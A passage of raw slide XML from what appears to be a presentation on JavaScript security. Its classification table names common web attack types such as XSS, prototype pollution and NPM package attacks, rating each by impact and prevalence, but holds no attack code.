          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>User Trust</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="5603796"/>
            <a:ext cx="2725579" cy="356235"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Users trust content from legitimate domains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8973741" y="6128623"/>
            <a:ext cx="311229" cy="311229"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E4E9"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="C8CACF"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9025652" y="6154579"/>
            <a:ext cx="207407" cy="259318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="6176129"/>
            <a:ext cx="1729026" cy="216098"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complex Ecosystem</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9369266" y="6476524"/>
            <a:ext cx="2725579" cy="356235"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Third-party libraries introduce vulnerabilities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569720" y="1361718"/>
            <a:ext cx="5985153" cy="520422"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2. Types of JavaScript Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1569720" y="1930956"/>
            <a:ext cx="3376136" cy="416243"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Classification</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1569720" y="2530554"/>
            <a:ext cx="11490960" cy="4337209"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1613"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="2538174"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="2619137"/>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Attack Type</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="2619137"/>
            <a:ext cx="3675936"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Description</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="2619137"/>
            <a:ext cx="1380768"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Impact</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="2619137"/>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Prevalence</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="2931081"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="3012043"/>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XSS (Cross-Site Scripting)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="3012043"/>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Inject malicious scripts into web pages</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="3012043"/>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Critical</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="3012043"/>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Very High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="3323987"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="3404949"/>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Prototype Pollution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="3404949"/>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Manipulate JavaScript object prototypes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="3404949"/>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High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="3404949"/>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20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="3716893"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="3797856"/>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DOM Clobbering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="3797856"/>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Override DOM properties with HTML elements</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="3797856"/>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24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="3797856"/>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Low</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="4109799"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="4190762"/>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JavaScript Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="4190762"/>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Execute arbitrary JavaScript code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="4190762"/>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Critical</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="4190762"/>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High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="4502706"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="4583668"/>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Client-Side Template Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="4583668"/>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Inject code into client-side templates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="4583668"/>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High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="4583668"/>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35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="4895612"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="4976574"/>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PostMessage Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="4976574"/>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Abuse cross-origin messaging</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="4976574"/>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39" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="4976574"/>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40" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="5288518"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="5369481"/>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WebSocket Hijacking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="5369481"/>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Intercept WebSocket communications</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="5369481"/>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High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="5369481"/>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Low</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="5681424"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="5762387"/>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Service Worker Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="5762387"/>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Compromise service worker scripts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="5762387"/>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Critical</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="5762387"/>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Low</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="6074331"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="6155293"/>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NPM Package Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="6155293"/>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Malicious third-party libraries</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="6155293"/>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Critical</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="6155293"/>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
        <p:nvSpPr>
          <p:cNvPr id="55" name="Shape 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577340" y="6467237"/>
            <a:ext cx="11475720" cy="392906"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Text 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743908" y="6548199"/>
            <a:ext cx="2532221" cy="230981"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1800"/>
              </a:lnSpc>
              <a:buNone/>
